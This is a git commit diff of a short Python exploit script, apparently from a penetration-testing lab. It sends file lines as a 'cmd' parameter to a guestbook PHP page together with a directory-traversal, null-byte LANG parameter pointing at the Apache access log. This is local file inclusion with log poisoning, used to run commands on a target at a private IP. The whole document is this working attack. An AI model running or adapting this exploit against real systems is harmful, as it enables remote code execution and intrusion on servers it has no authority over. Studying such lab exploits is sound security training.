cd84ff663751988688473a7b4765eabd41276482
Vic Harkness <46001860+VicHarkness@users.noreply.github.com>
2019-03-08 05:00:50 -0500

    Update fileecho.py
    Fixed issue with reading entire lines of file

--- fileecho.py
+++ fileecho.py
@@ -2,11 +2,15 @@ import requests
 import re
 
 line=''
-url1='http://xx.xx.xx.xx/addguestbook.php?name=a&comment=aaaaa&cmd='
+url1='http://10.11.24.54/addguestbook.php?name=a&comment=aaaaa&cmd='
 url2='&LANG=/../../../../../../../xampp/apache/logs/access.log%00Submit=Submit'
 
-echofile=open("nc.txt", "r")
+#for some reason doing this as I did in the password script caused only the start of lines to be read
+with open("nc.txt", "r") as echofile:
+    data = echofile.readlines()
 
-for x in echofile:
-    line=echofile.readline()
+for line in data:
     r=requests.get(url1+line+url2)
+~                                                                                                                                                                                  
+~                                                                                                                                                                                  
+~                     
